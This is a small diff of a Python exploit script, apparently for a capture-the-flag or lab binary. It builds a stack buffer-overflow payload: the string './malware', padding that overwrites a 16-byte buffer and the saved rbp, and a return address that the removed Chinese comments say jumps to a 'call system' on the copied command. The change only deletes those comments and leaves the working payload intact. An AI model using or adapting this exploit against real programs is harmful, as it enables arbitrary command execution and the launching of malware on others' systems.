@@ -4,8 +4,8 @@ import sys, struct
 
 p64 = lambda x: struct.pack("<Q", x)
 
-payload  = b"./malware\x00"            # 会被 strcpy 拷进全局 command_buf
-payload += b"A" * (24 - len(payload))  # 填满 16 字节缓冲区 + 8 字节 saved rbp
-payload += p64(0x401a6b)               # eval 中 "mov edi, command_buf; call system"
+payload  = b"./malware\x00"
+payload += b"A" * (24 - len(payload))
+payload += p64(0x401a6b)
 
 sys.stdout.buffer.write(payload)
